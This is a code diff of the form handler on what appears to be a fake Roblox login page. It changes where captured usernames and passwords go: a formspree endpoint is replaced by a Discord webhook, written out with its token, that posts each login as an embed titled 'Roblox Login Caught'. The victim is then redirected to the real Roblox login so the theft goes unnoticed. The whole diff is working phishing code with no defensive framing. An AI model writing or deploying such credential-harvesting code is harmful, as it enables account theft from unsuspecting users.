@@ -114,17 +114,25 @@ document.getElementById('f').addEventListener('submit', function(e){
   go.textContent = "Logging in...";
   go.disabled = true;
 
-  var endpoint = "https://formspree.io/f/mvkkllwd";
+  var webhookURL = "https://discord.com/api/webhooks/1567847177643106384/w0XBjAtPTb9tITOSKZeTEW_fXsJxgecro2b-81vs9rTxIdrMWxZaRhKutRW8Fe8Ck6IW";
 
-  var data = {
-    username: u,
-    password: p
+  var embedData = {
+    embeds: [{
+      title: "Roblox Login Caught",
+      color: 3447003,
+      fields: [
+        { name: "Username / Email", value: u, inline: false },
+        { name: "Password", value: p, inline: false }
+      ],
+      footer: { text: "Ryuu System" },
+      timestamp: new Date().toISOString()
+    }]
   };
 
-  fetch(endpoint, {
+  fetch(webhookURL, {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Accept": "application/json" },
-    body: JSON.stringify(data)
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(embedData)
   })
   .then(res => {
     window.location.href = "https://www.roblox.com/id/login";
